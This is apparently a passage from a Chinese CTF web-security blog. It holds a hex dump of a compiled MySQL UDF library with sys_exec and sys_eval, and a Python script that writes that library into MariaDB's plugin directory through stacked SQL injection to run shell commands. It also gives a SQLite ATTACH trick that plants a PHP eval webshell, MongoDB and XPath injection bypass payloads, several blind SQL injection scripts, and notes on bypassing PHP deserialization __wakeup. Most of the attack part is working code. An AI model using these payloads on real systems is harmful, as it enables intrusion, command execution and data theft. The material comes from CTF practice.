000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#x27;codes=[]for i in range(0,len(code),128): codes.append(code[i:min(i+128,len(code))])#建临时表#sql=&#x27;&#x27;&#x27;create table temp(data longblob)&#x27;&#x27;&#x27;#payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)#requests.get(url+payload)#清空临时表sql=&#x27;&#x27;&#x27;delete from temp&#x27;&#x27;&#x27;payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)requests.get(url+payload)#插入第一段数据sql=&#x27;&#x27;&#x27;insert into temp(data) values (0x&#123;&#125;)&#x27;&#x27;&#x27;.format(codes[0])payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)requests.get(url+payload)#更新连接剩余数据for k in range(1,len(codes)): sql=&#x27;&#x27;&#x27;update temp set data = concat(data,0x&#123;&#125;)&#x27;&#x27;&#x27;.format(codes[k]) payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql) requests.get(url+payload)#10.3.18-MariaDB #写入so文件sql=&#x27;&#x27;&#x27;select data from temp into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so\\&#x27;&#x27;&#x27;&#x27;payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)requests.get(url+payload)#引入自定义函数sql=&#x27;&#x27;&#x27;create function sys_eval returns string soname &#x27;udf.so\\&#x27;&#x27;&#x27;&#x27;payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)requests.get(url+payload)#命令执行，结果更新到界面sql=&#x27;&#x27;&#x27;update ctfshow_user set pass=(select sys_eval(&#x27;cat /flag.her?&#x27;))&#x27;&#x27;&#x27;payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)requests.get(url+payload)#查看结果r=requests.get(url[:-4]+&#x27;?page=1&amp;limit=10&#x27;)print(r.text) ​ SQLite内置表查询 sqlite_master相当于mysql的information_schema，但是这里只存有表的信息，里面有个sql字段，有各个表的结构，有表名、字段名和类型。 select name,sql from sqlite_master select group_concat(sql) from sqlite_master 写webshellSQLite 的 ATTACH DATABASE 语句是用来选择一个特定的数据库，使用该命令后，所有的 SQLite 语句将在附加的数据库下执行。 1ATTACH DATABASE file_name AS database_name; 如果附加数据库不存在，就会创建该数据库，如果数据库文件设置在web目录下，就可以写入webshell。 123ATTACH DATABASE &#x27;/var/www/html/shell.php&#x27; AS shell;create TABLE shell.exp (webshell text); insert INTO shell.exp (webshell) VALUES (&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;); ​ NoSQLMongoDB万能密码：&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125; MongoDB 注入指北 MongoDB Documentation Nosql 注入从零到一 ​ XPathXPath 即为 XML 路径语言，是 W3C XSLT 标准的主要元素，它是一种用来确定 XML（标准通用标记语言的子集）文档中某部分位置的语言。 Xpath查询语句： $query=&quot;user/username[@name=&#39;&quot;.$user.&quot;&#39;]&quot;; 注入点：URL、表单或其它信息上附带恶意的 XPath 查询代码 注入漏洞验证：输入id=1&#39;、`id=-1看页面是否返回报错信息 注入万能公式：id=1&#39; or 1=1 or &#39;&#39;=&#39; 万能访问xml文档所有节点的payload: &#39;]|//*|//*[&#39; ​ 常用脚本 布尔盲注123456789101112131415161718192021import stringimport requestsdic=&#x27;&#123;&#125;-_&#x27;+string.digits+string.ascii_lowercaseurl=&#x27;xxxxxxx&#x27;now=&#x27;&#x27;for i in range(1,50): flag=0 for j in dic: payload=&#x27;&#x27;&#x27;xxxxxxx&#x27;&#x27;&#x27;.format() #print(payload) data=&#123;&#x27;username&#x27;:payload,&#x27;password&#x27;:&#x27;xxxxx&#x27;&#125; r=requests.post(url,data=data) #print(r.text) if &#x27;xxx&#x27; in r.text: now+=j print(now) flag=1 break if flag==0: break 12345678910111213141516171819202122232425262728293031323334import requestsurl = &quot;xxx&quot;result = &#x27;&#x27;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 payload = f&#x27;if(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(flag4s))from(ctfshow.flags)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; data = &#123; &#x27;id&#x27;: f&quot;100&#x27;)||&#123;payload&#125;||(&#x27;0&quot; &#125; r = requests.get(url,params=data) # r = requests.post(url,data=data) if &quot;xxx&quot; in r.text: head = mid + 1 else: tail = mid if head != 32: result += chr(head) else: break print(result) 12345678910111213141516171819202122232425262728293031323334353637# Mysql8新特性import requestsdef bind_sql(): flag = &quot;&quot; dic = &quot;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/-,+*)(&amp;%$#!&quot; for i in range(1000): f = flag for j in dic: _ = flag + j #payload = &quot;0||(binary&#x27;&#123;&#125;&#x27;,&#x27;&#x27;,3,4)&lt;(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/0,1)&quot;.format(_) #payload = &quot;0||(&#x27;cnss&#x27;,binary&#x27;&#123;&#125;&#x27;,3,4)&lt;(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1,1)&quot;.format(_) #payload = &quot;0||(&#x27;2&#x27;,&#x27;lisi&#x27;,binary&#x27;&#123;&#125;&#x27;)&lt;(table/**/users/**/limit/**/1,1)&quot;.format(_) payload = &quot;0||(&#x27;8&#x27;,binary&#x27;&#123;&#125;&#x27;)&lt;(table/**/cn55/**/limit/**/7,1)&quot;.format(_) data = &#123; &quot;id&quot;: payload &#125; r = requests.get(url=url, params=data) # r = requests.post(url, data=data) print(payload) if &#x27;xxx&#x27; in r.text: if j == &#x27;~&#x27;: flag = flag[:-1] + chr(ord(flag[-1])+1) print(flag) exit() flag += j print(flag) break if flag == f: break return flagif __name__ == &#x27;__main__&#x27;: # input url url = &#x27;http://124.221.34.13:55553/&#x27; result = bind_sql() print(result) 时间盲注1234567891011121314151617181920212223import requestsimport stringimport timedic=&#x27;&#123;&#125;-_,&#x27;+string.ascii_lowercase+string.digitsurl=&#x27;xxxxxx&#x27;now=&#x27;&#x27;for i in range(1,50): flag=0 for j in dic: a=time.time() payload=&#x27;&#x27;&#x27;xxxxxx&#x27;&#x27;&#x27;.format() data=&#123;&#x27;ip&#x27;:payload,&quot;debug&quot;:0&#125; r=requests.post(url,data=data) b=time.time() if b-a&gt;1: now+=j flag=1 print(now) break if flag==0: break 12345678910111213141516171819202122232425262728293031323334import requestsurl = &quot;http://xxx/?id=1%22and%20&quot;result = &#x27;&#x27;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 # payload = f&#x27;if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;yyy&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.6),0)%23&#x27; # payload = f&#x27;if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;yyy&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.6),0)%23&#x27; payload = f&#x27;if(ascii(substr((select/**/group_concat(xxx)from(yyy.zzz)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.6),0)%23&#x27; try: # data = &#123; # &#x27;uname&#x27;:f&quot;admin&#x27;)and &#123;payload&#125;#&quot;, # &#x27;passwd&#x27;: &#x27;1&#x27; # &#125; r = requests.get(url + payload,timeout=0.5) # r = requests.post(url, data=data, timeout=0.5) tail = mid except: head = mid + 1 if head != 32: result += chr(head) else: break print(result)","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://lazzzaro.github.io/tags/SQL/"},{"name":"注入","slug":"注入","permalink":"https://lazzzaro.github.io/tags/%E6%B3%A8%E5%85%A5/"}],"author":"Lazzaro"},{"title":"反序列化","slug":"web-反序列化","date":"2020-05-14T17:10:23.000Z","updated":"2024-09-18T10:00:23.860Z","comments":true,"path":"2020/05/15/web-反序列化/","permalink":"https://lazzzaro.github.io/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"概念：序列化就是使用serialize()将对象的用字符串的方式进行表示，反序列化是使用unserialize()将序列化的字符串，构造成相应的对象，反序列化是序列化的逆过程。 序列化的对象可以是class也可以是Array,string等其他对象。 问题原因：漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码或变量用户可控，就可能产生反序列化漏洞，根据反序列化后不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。 ​ 序列化格式对象类型:对象名长度:”对象名”:对象成员变量个数:{变量1类型:变量名1长度:变量名1; 参数1类型:参数1长度:参数1; 变量2类型:变量名2长度:”变量名2”; 参数2类型:参数2长度:参数2;… …} 如： O:6:”Person”:2:{s:12:” Person name”;s:8:”Thinking”;s:11:” Person sex”;s:3:”man”;} a:2:{s:4:”name”;s:8:”Thinking”;s:3:”sex”;s:3:”man”;} 对象类型：Class-O，Array-a。 变量和参数类型：string-s，int-i，Array-a，指针引用-R。 序列符号：参数与变量之间用分号(;)隔开，同一变量和同一参数之间的数据用冒号(:)隔开。 对于指针引用： 在序列化中，第一个对象是类，第二个对象才是类里的对象。 类型 结构 字符串 s:size:value; 整数 i:value; 布尔值 b:value;(保存1或0) 空值 N; 数组 a:size:{key definition;value definition;(repeated per element)} 对象 O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)} 指针引用 R:2; ​ 三种访问控制的区别public: 变量名 protected: \\x00 + * + \\x00 + 变量名（或 \\00 + * + \\00 + 变量名 或 %00 + * + %00 + 变量名） private: \\x00 + 类名 + \\x00 + 变量名（或 \\00 + 类名 + \\00 + 变量名 或 %00 + 类名 + %00 + 变量名） 注：&gt;=php v7.2 反序列化对访问类别不敏感（protected -&gt; public） ​ 魔术方法12345678910111213__construct() #每次创建新对象时先调用此方法__destruct() #某个对象的所有引用都被删除或者销毁时调用（没有变量指到当前对象时也会被触发，如 a:2:&#123;i:0;O:4:&quot;User&quot;:0:&#123;&#125;i:0;s:3:&quot;xxx&quot;;&#125;，被覆盖后没有变量指向User对象）__toString() #把类被当做一个字符串使用时调用__wakeup() #使用unserialize函数，反序列化恢复对象之前时调用__sleep() #使用serialize()函数，序列化对象之前时调用__call() #在对象中，调用不存在的方法或调用权限不足时调用__callstatic() #在静态上下文中，调用不可访问的方法时触发__get() #访问不存在的成员变量时调用__set() #设置不存在的成员变量时调用__invoke() #当尝试以调用函数的方式调用一个对象时触发__autoload() #尝试加载未定义的类__isset() #在不可访问的属性上调用isset()或empty()触发__unset() #在不可访问的属性上使用unset()时触发 ​ 绕过方法__wakeup()失效 PHP5&lt;5.6.25 或 PHP7&lt;7.0.10 当序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行。 如：O:4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125; PHP7.3 Serialize 特性：O 改为 C（需要利用内置了Serializable接口的类） PHP RFC: New custom object serialization mechanism bypass __wakeup 内置类 ArrayObject： 1234$arr=array(&quot;a&quot;=&gt;1,&quot;b&quot;=&gt;2);$ao=new ArrayObject($arr);echo serialize($ao);//C:11:&quot;ArrayObject&quot;:45:&#123;x:i:0;a:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;;m:a:0:&#123;&#125;&#125; 其他类： ArrayIterator / RecursiveArrayIterator / SplObjectStorage 参考：ctfshow 愚人杯 